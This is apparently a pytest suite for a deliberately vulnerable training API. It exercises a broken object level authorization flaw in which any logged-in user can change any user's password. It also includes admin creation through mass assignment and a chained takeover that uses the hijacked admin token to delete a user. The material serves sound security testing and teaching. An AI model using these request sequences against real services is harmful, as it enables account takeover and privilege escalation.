"""
Test Unauthorized Password Change Vulnerability (API1:2023 Broken Object Level Authorization)

This test demonstrates unauthorized password change vulnerability in the
PUT /users/v1/{username}/password endpoint. When vuln=1, an authenticated user
can change ANY user's password, not just their own, by specifying the target
username in the URL path.

OWASP Reference: https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/

Vulnerability Location: api_views/users.py:186-192
"""

import pytest
import requests
import uuid


def test_unauthorized_password_change_of_another_user(api_base_url: str, user1_token: str):
    """
    Test that user1 can change another user's password without authorization.

    This demonstrates a critical vulnerability where the endpoint uses the username
    from the URL path instead of verifying it matches the authenticated user's identity.

    Steps:
        1. Create a test victim user
        2. User1 changes victim's password using victim's username in the URL
        3. Verify victim can no longer login with old password
        4. Verify victim CAN login with new password set by user1

    Expected behavior when vuln=1:
        - User1 can change victim's password
        - Returns 204 No Content (success)
        - Victim's password is actually changed

    Expected behavior when vuln=0:
        - User1 cannot change victim's password
        - Returns 400 or 403 (forbidden/bad request)
        - Victim's password remains unchanged
    """
    # Create a victim user
    victim_username = f"victim_{uuid.uuid4().hex[:8]}"
    victim_old_password = "oldpass123"

    register_response = requests.post(
        f"{api_base_url}/users/v1/register",
        json={
            "username": victim_username,
            "password": victim_old_password,
            "email": f"{victim_username}@test.com"
        }
    )
    assert register_response.status_code == 200, "Failed to create victim user"

    # Verify victim can login with old password (baseline)
    baseline_login = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": victim_username, "password": victim_old_password}
    )
    assert baseline_login.status_code == 200, \
        "Baseline test failed: victim cannot login with original password"

    # User1 attempts to change victim's password
    new_password = f"hacked_{uuid.uuid4().hex[:8]}"
    user1_headers = {"Authorization": f"Bearer {user1_token}"}

    change_response = requests.put(
        f"{api_base_url}/users/v1/{victim_username}/password",
        headers=user1_headers,
        json={"password": new_password}
    )

    # When vulnerable, this should succeed with 204
    # When secure, this should fail with 400 or 403
    assert change_response.status_code == 204, \
        f"Unauthorized password change vulnerability appears patched. " \
        f"Expected 204, got {change_response.status_code}"

    # Verify victim can no longer login with old password
    old_password_login = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": victim_username, "password": victim_old_password}
    )

    # Should fail because password was changed
    assert old_password_login.status_code != 200 or \
           old_password_login.json().get("status") != "success", \
        "Victim can still login with old password - password change did not take effect"

    # Verify victim CAN login with the new password set by user1
    new_password_login = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": victim_username, "password": new_password}
    )

    assert new_password_login.status_code == 200, \
        f"Victim cannot login with new password. Expected 200, got {new_password_login.status_code}"

    login_data = new_password_login.json()
    assert login_data.get("status") == "success", \
        "Victim login with new password did not succeed"

    # This proves that user1 successfully changed victim's password!


def test_unauthorized_password_change_of_admin(api_base_url: str, user1_token: str):
    """
    Test that a regular user can change an admin user's password.

    This demonstrates that even privileged accounts (admin) are vulnerable to
    unauthorized password changes by any authenticated user.

    Expected behavior when vuln=1:
        - Regular user can change admin's password
        - Returns 204 No Content
        - Admin account is compromised

    Expected behavior when vuln=0:
        - Regular user cannot change admin's password
        - Returns 400 or 403
    """
    # Create a test admin user
    admin_username = f"testadmin_{uuid.uuid4().hex[:8]}"
    admin_old_password = "adminpass123"

    register_response = requests.post(
        f"{api_base_url}/users/v1/register",
        json={
            "username": admin_username,
            "password": admin_old_password,
            "email": f"{admin_username}@test.com",
            "admin": True  # Create as admin via mass assignment
        }
    )
    assert register_response.status_code == 200, "Failed to create admin user"

    # Verify admin can login with old password
    baseline_login = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": admin_username, "password": admin_old_password}
    )
    assert baseline_login.status_code == 200, \
        "Baseline test failed: admin cannot login"

    # User1 (regular user) attempts to change admin's password
    new_password = f"pwned_admin_{uuid.uuid4().hex[:8]}"
    user1_headers = {"Authorization": f"Bearer {user1_token}"}

    change_response = requests.put(
        f"{api_base_url}/users/v1/{admin_username}/password",
        headers=user1_headers,
        json={"password": new_password}
    )

    # When vulnerable, even admin accounts can be compromised
    assert change_response.status_code == 204, \
        f"Unauthorized password change of admin appears patched. " \
        f"Expected 204, got {change_response.status_code}"

    # Verify admin can login with new password
    new_password_login = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": admin_username, "password": new_password}
    )

    assert new_password_login.status_code == 200 and \
           new_password_login.json().get("status") == "success", \
        "Admin password was not successfully changed"


def test_authorized_password_change_of_own_account(api_base_url: str):
    """
    Control test: Verify that users CAN change their own password (legitimate use).

    This ensures that the password change functionality works correctly for
    the intended use case: users changing their own passwords.

    Expected behavior (both vuln=1 and vuln=0):
        - User can change their own password
        - Returns 204 No Content
        - Password is successfully changed
    """
    # Create a test user for this test
    test_username = f"ownpasstest_{uuid.uuid4().hex[:8]}"
    old_password = "oldpass123"

    register_response = requests.post(
        f"{api_base_url}/users/v1/register",
        json={
            "username": test_username,
            "password": old_password,
            "email": f"{test_username}@test.com"
        }
    )
    assert register_response.status_code == 200, "Failed to create test user"

    # Login to get token
    login_response = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": test_username, "password": old_password}
    )
    assert login_response.status_code == 200, "Failed to login"
    token = login_response.json().get("auth_token")

    # User changes their own password
    new_password = f"mynewpassword_{uuid.uuid4().hex[:8]}"
    headers = {"Authorization": f"Bearer {token}"}

    change_response = requests.put(
        f"{api_base_url}/users/v1/{test_username}/password",
        headers=headers,
        json={"password": new_password}
    )

    # Should succeed
    assert change_response.status_code == 204, \
        f"User cannot change their own password. Expected 204, got {change_response.status_code}"

    # Verify can login with new password
    new_login = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": test_username, "password": new_password}
    )

    assert new_login.status_code == 200, \
        "User cannot login with new password after legitimate change"

    # Verify old password no longer works
    old_login = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": test_username, "password": old_password}
    )

    assert old_login.status_code != 200 or \
           old_login.json().get("status") != "success", \
        "Old password still works after password change"


def test_password_change_requires_authentication(api_base_url: str, default_credentials: dict):
    """
    Control test: Verify that password change requires authentication.

    This ensures that unauthenticated users cannot change passwords, even if
    the authorization check (which user can change which password) is broken.

    Expected behavior (both vuln=1 and vuln=0):
        - Requests without auth token should fail with 401
    """
    user2_username = default_credentials["user2"]["username"]
    new_password = "should_fail"

    # Attempt to change password without authentication
    change_response = requests.put(
        f"{api_base_url}/users/v1/{user2_username}/password",
        # No Authorization header
        json={"password": new_password}
    )

    # Should fail with 401
    assert change_response.status_code == 401, \
        f"Unauthenticated password change should fail. Expected 401, got {change_response.status_code}"


def test_password_change_with_missing_password_field(api_base_url: str, user1_token: str, default_credentials: dict):
    """
    Control test: Verify that password change validates required fields.

    This ensures proper input validation even when authorization is broken.

    Expected behavior (both vuln=1 and vuln=0):
        - Request without 'password' field should fail with 400
    """
    user2_username = default_credentials["user2"]["username"]
    user1_headers = {"Authorization": f"Bearer {user1_token}"}

    # Attempt to change password with missing password field
    change_response = requests.put(
        f"{api_base_url}/users/v1/{user2_username}/password",
        headers=user1_headers,
        json={}  # Empty body, no password field
    )

    # Should fail with 400
    assert change_response.status_code == 400, \
        f"Password change with missing field should fail. Expected 400, got {change_response.status_code}"


def test_password_change_cascade_attack(api_base_url: str, user1_token: str):
    """
    Test a cascade attack where user1 changes admin password, then uses
    admin privileges to cause further damage.

    This demonstrates the severity of the vulnerability by showing how it
    can lead to complete account takeover and privilege escalation.

    Steps:
        1. Create test admin and victim users
        2. User1 changes admin's password
        3. User1 logs in as admin with the new password
        4. User1 (now as admin) can delete other users

    Expected behavior when vuln=1:
        - Complete account takeover chain is possible
        - Regular user gains admin access

    Expected behavior when vuln=0:
        - Initial password change fails
        - Attack chain is broken
    """
    # Create test admin user
    admin_username = f"admintest_{uuid.uuid4().hex[:8]}"
    admin_old_password = "adminpass123"

    register_admin = requests.post(
        f"{api_base_url}/users/v1/register",
        json={
            "username": admin_username,
            "password": admin_old_password,
            "email": f"{admin_username}@test.com",
            "admin": True
        }
    )
    assert register_admin.status_code == 200, "Failed to create test admin"

    # Create victim user to delete later
    victim_username = f"victim_{uuid.uuid4().hex[:8]}"
    register_victim = requests.post(
        f"{api_base_url}/users/v1/register",
        json={
            "username": victim_username,
            "password": "victimpass",
            "email": f"{victim_username}@test.com"
        }
    )
    assert register_victim.status_code == 200, "Failed to create victim user"

    # Step 1: User1 changes admin password
    new_admin_password = f"takeover_{uuid.uuid4().hex[:8]}"
    user1_headers = {"Authorization": f"Bearer {user1_token}"}

    change_response = requests.put(
        f"{api_base_url}/users/v1/{admin_username}/password",
        headers=user1_headers,
        json={"password": new_admin_password}
    )

    assert change_response.status_code == 204, \
        "Unauthorized password change failed - vulnerability may be patched"

    # Step 2: Login as admin with new password
    admin_login = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": admin_username, "password": new_admin_password}
    )

    assert admin_login.status_code == 200, "Cannot login as admin with new password"

    admin_token = admin_login.json().get("auth_token")
    assert admin_token is not None, "No admin token received"

    # Step 3: Use admin token to delete victim user (proving we have admin privileges)
    admin_headers = {"Authorization": f"Bearer {admin_token}"}

    delete_response = requests.delete(
        f"{api_base_url}/users/v1/{victim_username}",
        headers=admin_headers
    )

    # Should succeed because we now have admin privileges
    assert delete_response.status_code == 200, \
        f"Cannot use compromised admin account. Expected 200, got {delete_response.status_code}"

    # This proves complete account takeover and privilege escalation!
